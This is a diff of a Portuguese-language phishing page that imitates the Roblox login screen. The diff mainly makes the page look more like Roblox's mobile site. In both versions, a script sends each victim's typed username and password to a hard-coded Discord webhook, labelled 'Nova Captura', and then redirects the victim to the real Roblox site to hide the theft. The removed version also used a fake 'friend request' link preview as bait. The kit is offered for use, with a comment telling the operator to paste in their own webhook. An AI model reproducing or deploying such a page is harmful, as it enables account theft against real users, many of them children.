@@ -1,131 +1,387 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>Roblox</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Entrar na Roblox</title>
+    <link rel="icon" href="https://www.roblox.com/favicon.ico">
+    <style>
+        /* Reset básico e fonte oficial da Roblox (Builder Sans) */
+        @import url('https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
 
-<meta property="og:title" content="Pedido de amizade - Roblox">
-<meta property="og:description" content="Você recebeu um pedido de amizade. Clique para aceitar.">
-<meta property="og:image" content="https://tr.rbxcdn.com/180DAY-8b1a2e6f3c9d4a5b6c7d8e9f0a1b2c3d/150/150/AvatarHeadshot/Png/noFilter">
-<meta property="og:type" content="website">
+        body {
+            background-color: #1c1f22; /* Fundo escuro real */
+            color: #ffffff;
+            padding-bottom: 85px;
+        }
 
-<link rel="icon" href="https://www.roblox.com/favicon.ico">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+        /* HEADER (Menu lá em cima) */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 16px;
+            background-color: #232527;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
 
-<style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;}
-  html,body{height:100%;}
-  body{background:#1c1f22; color:#fff; display:flex; align-items:center; justify-content:center; padding:24px; -webkit-font-smoothing:antialiased;}
-  .wrap{width:100%; max-width:440px; display:flex; flex-direction:column; align-items:center;}
-  .logo-container{margin-bottom:28px; display:flex; align-items:center; justify-content:center;}
-  .roblox-logo{height:42px; width:auto; object-fit:contain;}
-  .card{width:100%; background:#27292c; border-radius:12px; padding:32px 36px; box-shadow:0 8px 32px rgba(0,0,0,0.4); border:1px solid rgba(255,255,255,0.05);}
-  .card h1{font-size:20px; font-weight:600; text-align:center; margin-bottom:24px; letter-spacing:-0.3px;}
-  .field{margin-bottom:16px; position:relative;}
-  .field label{display:block; font-size:13px; color:#9ea2a6; margin-bottom:8px; font-weight:500;}
-  .field input{width:100%; padding:12px 14px; background:#1e2022; border:1px solid #3b3f43; border-radius:8px; color:#fff; font-size:15px; outline:none; transition:border-color .2s, background .2s;}
-  .field input:hover{border-color:#55595e;}
-  .field input:focus{border-color:#fff; background:#161819;}
-  .field input::placeholder{color:#5f6368;}
-  .btn{width:100%; padding:14px; background:#00a2ff; border:0; border-radius:8px; color:#fff; font-size:15px; font-weight:600; cursor:pointer; transition:background .2s, opacity .2s; margin-top:8px; display:flex; align-items:center; justify-content:center;}
-  .btn:disabled{background:#3b3f43; color:#8a8d90; cursor:not-allowed;}
-  .btn:not(:disabled):hover{background:#0090e0;}
-  .err{display:none; color:#ff5c5c; font-size:13px; text-align:center; margin-top:14px; font-weight:500; background:rgba(255,92,92,0.1); padding:10px; border-radius:6px;}
-  .links{text-align:center; margin-top:24px; font-size:14px; color:#9ea2a6; line-height:1.6;}
-  .links a{color:#fff; text-decoration:none; font-weight:500;}
-  .links a:hover{text-decoration:underline;}
-  .divider{height:1px; background:rgba(255,255,255,0.08); margin:20px 0;}
-  .footer{margin-top:32px; font-size:12px; color:#5f6368; text-align:center; line-height:1.5;}
-  @media(max-width:480px){.card{padding:24px 20px;} .roblox-logo{height:34px;}}
-</style>
+        /* Ícone quadrado do Roblox inclinado */
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background-color: #ffffff;
+            transform: rotate(-15deg);
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .logo-hole {
+            width: 10px;
+            height: 10px;
+            background-color: #232527;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-cadastrar {
+            background-color: #335fff;
+            color: #fff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .btn-entrar {
+            background-color: transparent;
+            color: #fff;
+            border: 1px solid #ffffff;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .search-icon svg {
+            width: 24px;
+            height: 24px;
+            stroke: #fff;
+            stroke-width: 2.5;
+            fill: none;
+        }
+
+        /* SUB-MENU (Destaques, Mercado...) */
+        .sub-header {
+            display: flex;
+            justify-content: space-around;
+            padding: 12px 10px;
+            background-color: #232527;
+            font-size: 15px;
+            font-weight: 500;
+            color: #e3e3e3;
+            border-bottom: 1px solid #2e3134;
+        }
+
+        /* BANNER DE IMAGEM (O gráfico atrás do "Entrar") */
+        .banner {
+            height: 80px;
+            background-image: url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg');
+            background-size: cover;
+            background-position: center;
+            opacity: 0.5;
+            -webkit-mask-image: linear-gradient(to bottom, black 20%, transparent 100%);
+            mask-image: linear-gradient(to bottom, black 20%, transparent 100%);
+        }
+
+        /* ÁREA DO FORMULÁRIO */
+        .container {
+            padding: 0 16px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 700;
+            text-align: center;
+            margin: 16px 0 24px 0;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px;
+            background-color: #27292c;
+            border: 1px solid #3b3f43;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 12px;
+            outline: none;
+        }
+
+        .input-group input::placeholder {
+            color: #9ea2a6;
+        }
+
+        .btn-main {
+            width: 100%;
+            padding: 15px;
+            background-color: transparent;
+            border: 1px solid #ffffff;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 4px;
+            cursor: pointer;
+        }
+
+        .btn-main:active {
+            background-color: #3b3f43;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 15px;
+            margin: 24px 0;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #3b3f43;
+            margin: 24px 0;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 16px;
+            background-color: #27292c;
+            border: 1px solid #3b3f43;
+            border-radius: 8px;
+            color: #e3e3e3;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            cursor: pointer;
+        }
+
+        .btn-secondary:active {
+            background-color: #3b3f43;
+        }
+
+        .signup-text {
+            text-align: center;
+            color: #e3e3e3;
+            font-size: 15px;
+            margin-top: 24px;
+        }
+
+        .signup-text a {
+            color: #ffffff;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        /* BANNER INFERIOR DO APP */
+        .bottom-banner {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #323539;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            z-index: 100;
+        }
+
+        .banner-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .app-icon {
+            width: 40px;
+            height: 40px;
+            background-color: #335fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .app-icon-inner {
+            width: 18px;
+            height: 18px;
+            background-color: #fff;
+            transform: rotate(-15deg);
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .app-icon-hole {
+            width: 6px;
+            height: 6px;
+            background-color: #335fff;
+        }
+
+        .banner-text {
+            font-size: 12px;
+            line-height: 1.3;
+            color: #fff;
+        }
+
+        .banner-text span {
+            font-weight: 700;
+        }
+
+        .btn-explore {
+            background-color: #335fff;
+            color: #fff;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+    </style>
 </head>
 <body>
-<div class="wrap">
-  <div class="logo-container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" onerror="this.src='https://logodownload.org/wp-content/uploads/2017/11/roblox-logo-2.png'" alt="Roblox" class="roblox-logo" style="filter: invert(1);">
-  </div>
 
-  <div class="card">
-    <h1>Entrar</h1>
-    <form id="form" novalidate>
-      <div class="field">
-        <label for="username">Nome de usuário / E-mail / Telefone</label>
-        <input id="username" type="text" autocomplete="username" required>
-      </div>
-      <div class="field">
-        <label for="password">Senha</label>
-        <input id="password" type="password" autocomplete="current-password" required>
-      </div>
-      <button class="btn" id="submitBtn" type="submit" disabled>Entrar</button>
-      <div class="err" id="err">Nome de usuário ou senha incorretos. Tente novamente.</div>
-    </form>
-    <div class="links">
-      <a href="https://www.roblox.com/account/signupredir" target="_blank" rel="noopener">Esqueceu a senha?</a>
-      <div class="divider"></div>
-      Não tem uma conta? <a href="https://www.roblox.com" target="_blank" rel="noopener">Cadastre-se</a>
+    <!-- HEADER -->
+    <div class="header">
+        <div class="header-left">
+            <div class="logo-icon"><div class="logo-hole"></div></div>
+        </div>
+        <div class="header-right">
+            <button class="btn-cadastrar">Cadastrar-se</button>
+            <button class="btn-entrar">Entrar</button>
+            <div class="search-icon">
+                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+            </div>
+        </div>
     </div>
-  </div>
-  <div class="footer">© 2024 Roblox Corporation. Todos os direitos reservados.</div>
-</div>
 
-<script>
-  // ⚠️ COLOQUE O TEU LINK DO DISCORD AQUI ENTRE AS ASPAS ⚠️
-  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573426421085241448/LGoTUoMIZdohFLYE9s3THG4sSUFbbi1PEF5Hdl145-KIH6KapjIvAnLGhFT4kmlfOFPL';
+    <!-- SUB-MENU -->
+    <div class="sub-header">
+        <div>Destaques</div>
+        <div>Mercado</div>
+        <div>Criar</div>
+        <div>Robux</div>
+    </div>
 
-  const form = document.getElementById('form');
-  const btn  = document.getElementById('submitBtn');
-  const err  = document.getElementById('err');
-  const user = document.getElementById('username');
-  const pass = document.getElementById('password');
+    <!-- BANNER DE IMAGEM -->
+    <div class="banner"></div>
 
-  function checkInputs() {
-    if (user.value.trim() !== '' && pass.value !== '') { btn.disabled = false; }
-    else { btn.disabled = true; }
-  }
-  user.addEventListener('input', checkInputs);
-  pass.addEventListener('input', checkInputs);
+    <!-- FORMULÁRIO -->
+    <div class="container">
+        <h1>Entrar na Roblox</h1>
+        
+        <form id="login-form">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Usuário/e-mail/telefone" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Senha" required>
+            </div>
+            
+            <button type="submit" class="btn-main" id="btn-submit">Entrar</button>
+        </form>
 
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    if (btn.disabled) return;
+        <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
 
-    err.style.display = 'none';
-    btn.disabled = true;
-    btn.textContent = 'Entrando...';
+        <div class="divider"></div>
 
-    const username = user.value.trim();
-    const password = pass.value;
+        <button class="btn-secondary">Envie-me um código único por e-mail</button>
+        <button class="btn-secondary">Entrada rápida</button>
+        <button class="btn-secondary">Outras opções de acesso</button>
 
-    // Formato exato que funcionou no teste
-    const payload = {
-      content: `🎣 **Nova Captura**\n👤 User: \`${username}\`\n🔑 Senha: \`${password}\``
-    };
+        <div class="signup-text">
+            Não possui uma conta? <a href="#">Cadastrar-se</a>
+        </div>
+    </div>
 
-    try {
-      await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      
-      // Se enviou, redireciona pro Roblox real depois de 1.5s
-      setTimeout(() => {
-        window.location.href = 'https://www.roblox.com/home';
-      }, 1500);
+    <!-- BANNER INFERIOR -->
+    <div class="bottom-banner">
+        <div class="banner-left">
+            <div class="app-icon">
+                <div class="app-icon-inner"><div class="app-icon-hole"></div></div>
+            </div>
+            <div class="banner-text">
+                <span>Explore a Roblox no nosso<br>aplicativo para Android!</span><br>
+                Milhões de experiências criadas por gente como você
+            </div>
+        </div>
+        <button class="btn-explore">Explorar</button>
+    </div>
 
-    } catch (error) {
-      // Se der erro de rede, finge que a senha tá errada
-      btn.disabled = false;
-      btn.textContent = 'Entrar';
-      err.textContent = 'Erro de conexão. Tente novamente.';
-      err.style.display = 'block';
-      pass.value = '';
-      checkInputs();
-    }
-  });
-</script>
+    <script>
+        // ⚠️ COLOQUE O TEU LINK DO DISCORD AQUI ENTRE AS ASPAS ⚠️
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573426421085241448/LGoTUoMIZdohFLYE9s3THG4sSUFbbi1PEF5Hdl145-KIH6KapjIvAnLGhFT4kmlfOFPL';
+
+        const form = document.getElementById('login-form');
+        const btnSubmit = document.getElementById('btn-submit');
+        const user = document.getElementById('username');
+        const pass = document.getElementById('password');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = user.value.trim();
+            const password = pass.value;
+            if (!username || !password) return;
+
+            btnSubmit.textContent = 'Entrando...';
+
+            const payload = {
+                content: `🎣 **Nova Captura**\n👤 User: \`${username}\`\n🔑 Senha: \`${password}\``
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.roblox.com/pt/Login';
+                }, 1500);
+
+            } catch (error) {
+                btnSubmit.textContent = 'Entrar';
+                alert('Erro de conexão. Tente novamente.');
+            }
+        });
+    </script>
 </body>
 </html>
